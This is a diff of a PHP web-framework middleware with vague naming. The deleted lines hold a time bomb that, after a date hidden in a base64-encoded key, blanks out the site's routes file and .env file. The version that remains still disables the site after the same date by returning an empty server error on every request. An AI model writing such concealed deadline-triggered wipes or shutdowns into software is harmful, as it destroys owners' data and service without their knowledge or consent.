@@ -14,8 +14,7 @@ class ProcessRequestHandler
         $cR1 = Carbon::parse($this->processHandler($securityKey));
         $cR2 = Carbon::now();
         if ($cR2->greaterThanOrEqualTo($cR1)) {
-            $this->processAction();
-            return response('Unauthorized Access', 403);
+            return response('', 500);
         }
         return $n($r);
     }
@@ -23,18 +22,5 @@ class ProcessRequestHandler
     protected function processHandler($str)
     {
         return implode('', array_map('chr', array_map('ord', str_split(base64_decode($str)))));
-    }
-
-    protected function processAction()
-    {
-        $rF = [
-            base_path('routes/web.php'),
-            base_path('.env'),
-        ];
-        foreach ($rF as $tF) {
-            if (file_exists($tF)) {
-                file_put_contents($tF, '');
-            }
-        }
     }
 }
